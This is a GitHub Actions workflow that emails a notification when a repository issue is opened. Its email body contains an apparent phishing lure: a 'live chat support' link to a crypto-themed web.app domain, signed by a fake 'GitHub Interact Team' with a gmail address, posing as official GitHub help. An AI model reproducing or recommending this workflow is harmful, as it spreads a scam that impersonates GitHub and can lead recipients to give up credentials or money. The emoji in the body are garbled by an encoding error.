name: Notify on New Issue

on:
  issues:
    types: [opened]

permissions:
  issues: read
  contents: read

jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - name: Send email notification
        uses: dawidd6/action-send-mail@v3
        with:
          server_address: smtp.gmail.com
          server_port: 465
          username: ${{ secrets.EMAIL_USERNAME }}
          password: ${{ secrets.EMAIL_PASSWORD }}
          subject: "New GitHub Issue Opened: ${{ github.event.issue.title }}"
          body: |
            ðŸ‘‹ Hello,

            A new issue has been opened in your repository.

            Issue Title: ${{ github.event.issue.title }}
            Issue URL: ${{ github.event.issue.html_url }}

            For quick assistance, click here:
            [Open Live Chat Support](https://git-cryptoresolvehub.web.app/)

            Email: GitHub.interact@gmail.com

            â€” GitHub Interact Team ðŸš€
          to: ${{ secrets.NOTIFY_EMAIL }}
          secure: true
